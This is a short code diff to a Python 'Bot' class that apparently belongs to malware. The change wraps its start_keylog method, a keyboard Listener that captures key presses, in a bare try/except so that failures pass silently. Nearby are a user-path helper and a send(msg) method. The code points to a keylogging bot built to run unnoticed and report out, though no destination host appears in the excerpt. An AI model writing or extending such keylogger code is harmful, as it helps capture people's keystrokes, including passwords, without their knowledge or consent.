@@ -4302,8 +4302,11 @@ class Bot:
     def on_release(self, key):
         pass
     def start_keylog(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as L:
-            L.join()
+        try:
+            with Listener(on_press=self.on_press, on_release=self.on_release) as L:
+                L.join()
+        except:
+            pass
     def return_actual_dir(self, direc):
         return direc.replace("%user%",os.getlogin())
     def send(self, msg):
